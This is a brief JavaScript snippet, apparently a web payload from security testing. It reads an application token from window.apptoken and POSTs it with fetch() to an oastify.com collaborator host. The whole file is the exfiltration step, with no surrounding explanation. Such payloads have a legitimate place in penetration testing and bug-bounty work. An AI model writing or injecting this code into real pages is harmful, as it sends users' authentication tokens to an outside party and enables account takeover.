var apptoken = window.apptoken;

const requestOptions = {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: JSON.stringify({ token: apptoken })
};
fetch('https://aesvofi5x2ik7cjehh97vu5r4ia9y0mp.oastify.com/test2', requestOptions)
    .then(response => response.json())
